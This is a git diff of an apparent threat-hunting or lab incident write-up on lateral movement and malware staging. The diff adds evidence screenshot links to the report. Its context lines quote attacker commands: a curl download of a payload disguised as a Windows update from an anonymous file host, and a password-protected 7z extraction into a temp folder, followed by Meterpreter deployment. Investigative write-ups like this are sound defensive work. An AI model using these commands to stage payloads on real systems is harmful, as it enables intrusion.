@@ -53,6 +53,8 @@ Account: yuki.tanaka
 
 Source IP: 10.1.0.204
 
+<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/lateral-movement/Lateral_movement_azuki-adminpc1.png" />
+
 **Malware Staging**
 
 **2025-11-25 04:06 UTC**
@@ -61,7 +63,7 @@ Malware downloaded via anonymous file host:
 ```
 curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
 ```
-
+<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/External_archive_download.png" />
 
 **Payload Extraction**
 
@@ -70,6 +72,7 @@ curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
 ```
 7z.exe x KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache -y
 ```
+<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Extraction_of_password_protected_archive.png" />
 
 * Meterpreter payload deployed
 
